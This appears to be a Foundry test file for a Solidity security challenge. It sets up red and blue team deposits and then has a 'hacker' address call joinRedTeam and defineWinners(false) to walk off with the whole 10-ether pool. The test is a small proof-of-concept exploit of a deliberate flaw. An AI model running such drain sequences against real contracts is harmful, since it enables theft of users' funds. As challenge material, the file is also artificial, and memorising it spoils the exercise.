// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import { Test, console } from "forge-std/Test.sol";
import { IKnowYulNeverHackThis } from "../src/3_IKnowYulNeverHackThis.sol";


contract IKnowYulNeverHackThisTest is Test {
    IKnowYulNeverHackThis public target;

    address[] public players = [address(0x01), address(0x02), address(0x03), address(0x04), address(0x05), address(0x06), address(0x07), address(0x08), address(0x09)];


    function setUp() public {
     target = new IKnowYulNeverHackThis();

        for (uint256 i; i < players.length; ++i) {
            vm.deal(players[i], 1 ether);
            if (i % 2 == 0) {
                vm.prank(players[i]);
                target.joinRedTeam{value: 1 ether}();
            } else {
                vm.prank(players[i]);
                target.joinBlueTeam{value: 1 ether}();
            }
        }
    }
    


    function test_GetThisPassing_3() public {
        address hacker = address(0xBAD);
        uint256 amount = 1 ether;
        vm.deal(hacker, amount);

        vm.startPrank(hacker);
    
target.joinRedTeam{value: amount}();
        target.defineWinners(false);
        vm.stopPrank();
        
     assertEq(hacker.balance, 10 ether);
    }

}